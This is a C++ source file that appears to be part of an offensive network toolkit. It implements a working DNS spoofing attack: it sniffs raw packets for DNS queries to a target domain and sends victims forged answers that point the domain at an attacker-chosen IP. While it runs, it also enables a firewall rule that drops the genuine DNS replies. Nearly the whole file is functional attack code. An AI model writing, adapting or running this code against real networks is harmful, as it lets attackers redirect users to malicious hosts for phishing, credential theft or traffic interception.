#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <vector>

#include "../headers/dns.h"
#include "../headers/helperfuncs.h"

DNS::DNS(Mode mode) : current_mode(mode), stop_flag(false) {}

DNS::~DNS() {
    stop();
}

std::string DNS::get_name() {
    return "DNS Spoofing";
}

void DNS::stop() {
    stop_flag = true;
    for (auto& t : attack_threads) {
        if (t.joinable()) t.join();
    }
    attack_threads.clear();

    //std::cout << "[*] Removing Firewall Block..." << std::endl;
    HelperFunctions::toggle_dns_drop_rule(false); // DISABLE Block
}

void DNS::set_target_domain(std::string domain) {
    this->target_domain = domain;
}

void DNS::run(Session* session) {
    if (session->interface.empty()) {
        std::cerr << "DNS Attack requires an Interface." << std::endl;
        return;
    }
    // Pull config from session if set there, or internal variables
    if (this->target_domain.empty()) this->target_domain = session->dns_target_domain;
    this->spoof_ip = session->dns_spoofed_ip; 

    if (target_domain.empty() || spoof_ip.empty()) {
        std::cerr << "DNS Spoofing requires a Target Domain and a Spoofed IP." << std::endl;
        return;
    }

    //std::cout << "[*] Activating Firewall Block for Real DNS..." << std::endl;
    HelperFunctions::toggle_dns_drop_rule(true); // ENABLE Block

    stop_flag = false;
    std::cout << C_GREEN << "[*] Starting DNS Spoofing on " << C_CYAN << session->interface << C_RESET << std::endl;
    
    std::cout << C_GREEN << "[*] Target: " << C_YELLOW << target_domain << C_RESET 
              << " -> Redirect to: " << C_RED << spoof_ip << C_RESET << std::endl;

    // We need the Gateway MAC to know who to send the fake response to (usually)
    // or we just swap the source/dest from the captured packet.
    attack_threads.emplace_back(&DNS::spoof_loop, this, session->interface);
}

// Checksum Helper (Standard Internet Checksum)
unsigned short dns_checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// UDP Checksum Helper (Pseudo-header + UDP)
unsigned short udp_checksum(struct ip *iph, struct udphdr *udph, uint8_t *payload, int payload_len) {
    unsigned long sum = 0;
    struct {
        unsigned long saddr;
        unsigned long daddr;
        uint8_t zero;
        uint8_t proto;
        unsigned short len;
    } pseudo_header;

    pseudo_header.saddr = iph->ip_src.s_addr;
    pseudo_header.daddr = iph->ip_dst.s_addr;
    pseudo_header.zero = 0;
    pseudo_header.proto = IPPROTO_UDP;
    pseudo_header.len = udph->len;

    unsigned short *ptr = (unsigned short *)&pseudo_header;
    for (size_t i = 0; i < sizeof(pseudo_header) / 2; i++) sum += ptr[i];

    ptr = (unsigned short *)udph;
    for (size_t i = 0; i < sizeof(struct udphdr) / 2; i++) sum += ptr[i];

    ptr = (unsigned short *)payload;
    for (size_t i = 0; i < (size_t)payload_len / 2; i++) sum += ptr[i];
    
    if (payload_len % 2) sum += ((unsigned char *)payload)[payload_len - 1] << 8;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void DNS::spoof_loop(std::string interface) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("Socket failed"); return; }

    uint8_t buffer[65535];

    while (!stop_flag) {
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len <= 0) continue;

        // Parse Ethernet
        struct ethhdr* eth = (struct ethhdr*)buffer;
        if (ntohs(eth->h_proto) != ETH_P_IP) continue;

        // Parse IP
        struct ip* iph = (struct ip*)(buffer + sizeof(struct ethhdr));
        if (iph->ip_p != IPPROTO_UDP) continue;

        // Parse UDP
        struct udphdr* udph = (struct udphdr*)(buffer + sizeof(struct ethhdr) + (iph->ip_hl * 4));
        
        // Check for DNS Query (Port 53)
        if (ntohs(udph->dest) == 53) {
            //std::cout << "[DEBUG] Saw a UDP packet on Port 53! Length: " << len << std::endl; // <--- ADD THIS

            uint8_t* dns_payload = (uint8_t*)(udph + 1);
            ssize_t dns_len = len - (sizeof(struct ethhdr) + (iph->ip_hl * 4) + sizeof(struct udphdr));

            if (is_dns_query(dns_payload, dns_len)) {
                int offset = 0;
                std::string requested_domain = parse_dns_name(dns_payload, &offset, dns_len);
                
                //std::cout << "[DEBUG] Parsed Domain: " << requested_domain << std::endl; // <--- ADD THIS
                
                if (requested_domain.find(this->target_domain) != std::string::npos) {
                    std::cout << C_GREEN << "[+] TARGET MATCH! Forging reply..." << C_RESET << std::endl;
                    forge_response(sock, buffer, len, this->spoof_ip, interface);
                }
            } else {
                //std::cout << "[DEBUG] Packet is not a standard query." << std::endl; // <--- ADD THIS
            }
        }
    }
    close(sock);
}

bool DNS::is_dns_query(uint8_t* buffer, ssize_t len) {
    if ((size_t)len < sizeof(dns_header)) return false;
    dns_header* dns = (dns_header*)buffer;
    // QR flag (bit 15) must be 0 for Query
    return (ntohs(dns->flags) & 0x8000) == 0;
}

std::string DNS::parse_dns_name(uint8_t* buffer, int* offset, ssize_t max_len) {
    std::string name = "";
    // Skip Header
    ssize_t pos = sizeof(dns_header);
    
    while (pos < max_len) {
        uint8_t len = buffer[pos];
        if (len == 0) { pos++; break; } // End of name
        
        // Read label
        for (int i = 0; i < len; i++) {
            pos++;
            if (pos >= max_len) return "";
            name += (char)buffer[pos];
        }
        name += ".";
        pos++;
    }
    if (!name.empty()) name.pop_back(); // Remove trailing dot
    return name;
}

void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spoof_ip, std::string interface) {
    // 1. POINTERS
    struct ethhdr* eth = (struct ethhdr*)buffer;
    struct ip* iph = (struct ip*)(buffer + sizeof(struct ethhdr));
    struct udphdr* udph = (struct udphdr*)(buffer + sizeof(struct ethhdr) + (iph->ip_hl * 4));
    dns_header* dns = (dns_header*)(udph + 1);

    // 2. SWAP ETHERNET ADDRS
    uint8_t temp_mac[6];
    memcpy(temp_mac, eth->h_dest, 6);
    memcpy(eth->h_dest, eth->h_source, 6);
    memcpy(eth->h_source, temp_mac, 6);

    // 3. SWAP IP ADDRS
    uint32_t temp_ip = iph->ip_src.s_addr;
    iph->ip_src.s_addr = iph->ip_dst.s_addr;
    iph->ip_dst.s_addr = temp_ip;

    // 4. SWAP UDP PORTS
    uint16_t temp_port = udph->source;
    udph->source = udph->dest;
    udph->dest = temp_port;

    // 5. MODIFY DNS HEADER
    // 0x8180: QR=1 (Resp), Opcode=0, AA=1 (Auth), TC=0, RD=1, RA=1, Z=0, RCODE=0
    dns->flags = htons(0x8180); 
    dns->ans_count = htons(1);  // 1 Answer
    dns->auth_count = 0;        // 0 Authority
    dns->add_count = 0;         // 0 Additional

    // 6. CALCULATE OFFSET TO END OF QUESTION
    // We append our answer directly after the Question section.
    uint8_t* dns_payload = (uint8_t*)(dns);
    int pos = sizeof(dns_header);
    
    // Walk the labels (e.g., 3www6google3com0) to find the end
    while(pos < len) {
        if (dns_payload[pos] == 0) { pos++; break; } // Found the null terminator
        pos += dns_payload[pos] + 1;
    }
    pos += 4; // Skip QTYPE (2) and QCLASS (2)
    
    // 7. APPEND ANSWER
    uint8_t* answer_ptr = dns_payload + pos;
    
    // Name Pointer (0xC00C): Points to the start of the Name in the header
    *answer_ptr++ = 0xC0;
    *answer_ptr++ = 0x0C;

    // Type (A = 1), Class (IN = 1), TTL, DataLen
    dns_rr_tail tail;
    tail.type = htons(1);
    tail._class = htons(1);
    tail.ttl = htonl(300);      // 5 Minutes
    tail.data_len = htons(4);   // IPv4 is 4 bytes

    memcpy(answer_ptr, &tail, sizeof(tail));
    answer_ptr += sizeof(tail);

    // The Fake IP Address
    inet_pton(AF_INET, spoof_ip.c_str(), answer_ptr);
    answer_ptr += 4;

    // 8. UPDATE LENGTHS
    int dns_total_len = (answer_ptr - dns_payload);
    udph->len = htons(sizeof(struct udphdr) + dns_total_len);
    iph->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + dns_total_len);

    // 9. RECALCULATE CHECKSUMS (STRICT ORDER)
    
    // A. IP Checksum
    iph->ip_sum = 0;
    // CRITICAL FIX: Use 'iph->ip_hl * 4' instead of 'sizeof(struct ip)' 
    // to handle packets with IP Options correctly.
    iph->ip_sum = dns_checksum((unsigned short *)iph, iph->ip_hl * 4);
    
    // B. UDP Checksum (Disable)
    // We set it to 0 to tell the victim "Don't validate checksum". 
    // This avoids math errors in complex environments.
    udph->check = 0;

    // 10. SEND
    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_family = AF_PACKET;
    
    // Get Interface Index (Quickly)
    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ-1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    device.sll_ifindex = ifr.ifr_ifindex;
    
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, eth->h_dest, 6); // Send to Victim's MAC

    sendto(sock, buffer, ntohs(iph->ip_len) + sizeof(struct ethhdr), 0, (struct sockaddr*)&device, sizeof(device));
}